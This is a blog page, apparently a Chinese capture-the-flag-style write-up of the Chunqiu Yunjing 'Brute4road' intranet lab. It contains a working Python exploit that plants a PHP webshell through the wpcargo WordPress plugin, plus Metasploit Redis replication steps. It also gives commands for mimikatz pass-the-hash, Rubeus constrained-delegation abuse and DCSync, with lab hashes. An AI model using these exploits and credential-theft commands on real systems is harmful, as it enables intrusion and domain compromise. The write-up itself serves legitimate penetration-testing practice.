@@ -1,0 +1,693 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Avatar.jpg">
+  <link rel="icon" href="/img/Avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="suuuu">
+  <meta name="keywords" content="blog">
+  
+    <meta name="description" content="扫描得到ftp匿名访问与redis未授权，先都连一下没什么东西，再看看redis，使用mdut增强版去连接提示可以打主从同步这里也试过别的，都提示权限不足那我们直接打主从复制，这里最好在msf打，不然别的只能打一次，不小心掉了就要重置主机 12345use exploit&#x2F;linux&#x2F;redis&#x2F;redis_replication_cmd_execset RHOSTS 39.98.107.241s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Brute4road">
+<meta property="og:url" content="https://www.susec.xyz/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/index.html">
+<meta property="og:site_name" content="suuuu&#39;s blog">
+<meta property="og:description" content="扫描得到ftp匿名访问与redis未授权，先都连一下没什么东西，再看看redis，使用mdut增强版去连接提示可以打主从同步这里也试过别的，都提示权限不足那我们直接打主从复制，这里最好在msf打，不然别的只能打一次，不小心掉了就要重置主机 12345use exploit&#x2F;linux&#x2F;redis&#x2F;redis_replication_cmd_execset RHOSTS 39.98.107.241s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105541008.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105522769.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105630702.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105644245.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105940567.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210104754181.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210104840595.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210105209503.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210105608535.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210105703261.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210110305347.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210111653577.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210112737009.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210113840651.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210161751208.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210161840787.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210162209377.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210162603684.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210163032987.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210163911207.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210164109328.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210164227646.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210164247329.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210170820258.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210171200843.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210171238059.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210171854860.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210172207238.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210172910588.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210172937191.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210174342879.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210174424832.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210174729977.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220029485.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210175204863.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250212144119598.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220058953.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220441609.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220504562.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220644028.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220850302.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250212150524435.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250212150633337.png">
+<meta property="article:published_time" content="2025-03-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-09T09:06:19.049Z">
+<meta property="article:author" content="suuuu">
+<meta property="article:tag" content="打靶">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105541008.png">
+  
+  
+  
+  <title>春秋云镜-Brute4road - suuuu&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.susec.xyz","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>suuuu</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/BlackRoses.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜-Brute4road"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-08 00:00" pubdate>
+          2025年3月8日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜-Brute4road</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105541008.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>扫描得到ftp匿名访问与redis未授权，先都连一下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105522769.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>没什么东西，再看看redis，使用mdut增强版去连接<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105630702.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105644245.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>提示可以打主从同步<br>这里也试过别的，都提示权限不足<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250205105940567.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>那我们直接打主从复制，这里最好在msf打，不然别的只能打一次，不小心掉了就要重置主机</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/linux/redis/redis_replication_cmd_exec<br><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">39.98.107.241</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SRVHOST</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST</span> <br>exploit<br></code></pre></td></tr></table></figure>
+<p>理论上是可行的，但是我的这台服务器nc出了点问题，所以我又换了个工具<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210104754181.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>这台机器可以正向连接，正向连接之后我又反弹回了一台装了nc的windows机器，我试过直接反向也有点问题<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210104840595.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>只能说方法总比困难多，这里如果出现乱码可以先chcp 65001再监听<br>看到权限不足，提权，一般来说Linux提权就是内核提权，sudo suid，配置利用，应用服务<br>内核就是uname -a然后一把梭，这里怕又打崩了（打主从已经重启了n次），先看看sudo suid<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210105209503.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>看到一个base64，这个应该可行<br><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/base64/">https://gtfobins.github.io/gtfobins/base64/</a><br>可惜的是只能读取文件，如果后续有需要还是得上内核提权<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210105608535.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>先把flag读了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210105703261.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>接下来就信息收集，进一步对内网渗透<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210110305347.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>内网网段：172.22.2.7&#x2F;24<br>试了下有wget，把代理工具传上去，再fscan一下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210111653577.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>还有四台主机，画个图先<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210112737009.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>我的思路是18,16双管齐下，看看有没有nday<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210113840651.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>16没爆出来，放弃<br>wordpress可以用wpscan，现在还有在更新，虽然要什么激活码，但是还是能扫出来很多东西<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210161751208.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>看到这个插件，wordpress插件漏洞很多，我们搜一下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210161840787.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>找到个rce跟sql注入，打rce</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># This is a magic string that when treated as pixels and compressed using the png</span><br><span class="hljs-comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span><br>payload = <span class="hljs-string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_character_code</span>(<span class="hljs-params">c: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c).replace(<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>)<br><br>text = <span class="hljs-string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> binascii.unhexlify(payload)])[<span class="hljs-number">1</span>:]<br><br>destination_url = <span class="hljs-string">&#x27;http://172.22.2.18/&#x27;</span><br>cmd = <span class="hljs-string">&#x27;ls&#x27;</span><br><br><span class="hljs-comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span><br>requests.get(<br>    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="hljs-subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span><br>)<br><br><span class="hljs-comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span><br><span class="hljs-built_in">print</span>(requests.post(<br>    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="hljs-string">&quot;2&quot;</span>: cmd&#125;<br>).content.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210162209377.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>看一下代码也很好理解，写在了根目录webshell.php我们再写一个一句话木马<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210162603684.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>信息收集<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210163032987.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>看到数据库账号密码，无论从提权还是后续利用这都是个很好的切入点<br>这里我切哥斯拉连接了mysql，蚁剑要插件，我这里没装<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210163911207.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210164109328.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>一眼看到flag<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210164227646.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210164247329.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>找到flag跟看着很像密码本的东西，那就开始爆破，这个用的话要在左边点就好了，一开始还在那输sql语句<br>这里要注意，直接点的话最后面有个limit 0,10搞得我爆破不出来研究了半天，一共是有1000条数据的<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210170820258.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>如果爆破不出来推荐换个工具，我爆破了好几次<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210171200843.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>这里试了下哥斯拉特战版，亲测mdut一连用不了几下就卡死了，还得是哥斯拉<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210171238059.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>看到主机3389开着<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210171854860.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210172207238.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>传了个sweetpotato提权成功，然后就是加个账号，远程连<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210172910588.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210172937191.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>成功<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210174342879.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>找到flag<br>然后就是信息收集<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210174424832.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现这台主机在域里，那我们试下抓取密码去横<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210174729977.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>爆出巨多hash<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220029485.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>找到一个在域内的，各种横都打打看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210175204863.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>失败失败全是失败<br>我们再考虑别的<br>sekurlsa::pth &#x2F;user:MSSQLSERVER$ &#x2F;domain:xiaorang.lab &#x2F;ntlm:cea3e66a2715c71423e7d3f0ff6cd352 &#x2F;run:powershell<br>拉起查到mssqlserver是约束委派账号<br><code>AdFind.exe -b &quot;DC=xiaorang,DC=lab&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250212144119598.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现mssqlserver机器设置的约束委派，可以访问DC的LDAP和CIFS服务<br>这里打约束委派，主要是通过rubeus，用最新的话要用vs2019手动编译，2022还要搞诸多环境，时间就是金钱<br>约束委派资料<br><a target="_blank" rel="noopener" href="https://s4u2self.cc/wei-pai-.md?locale=zh">https://s4u2self.cc/wei-pai-.md?locale=zh</a><br>rubeus下载<br><a target="_blank" rel="noopener" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/Rubeus.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/Rubeus.exe</a><br>这里给出一个能用的（没查过有没有毒）<br><code>Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:44215e436c058343f7bcc18f8cb96c13 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220058953.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><code>./Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAg</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220441609.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>lsadump::dcsync &#x2F;domain:xiaorang.lab &#x2F;user:Administrator<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220504562.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>拿到administrator的hash，再次用出我们的工具横就完事<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220644028.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>完成<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250210220850302.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>我们netstat可以发现这台机子3389也是开着的，也是加个用户上去就能远程连接<br>还有个人客户机，我们也可以直接用impacket直接改个ip就能横过去<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250212150524435.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>至此拿下全部主机，我们再来做个最后的总结<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250212150633337.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6/" class="category-chain-item">打靶</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%89%93%E9%9D%B6/" class="print-no-link">#打靶</a>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91/" class="print-no-link">#内网</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云镜-Brute4road</div>
+      <div>https://www.susec.xyz/2025/03/08/春秋云镜-Brute4Road/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>suuuu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/" title="春秋云镜-Tsclient">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">春秋云镜-Tsclient</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/29/Impacket-GUI%E5%BC%80%E5%8F%91/" title="Impacket-GUI开发">
+                        <span class="hidden-mobile">Impacket-GUI开发</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
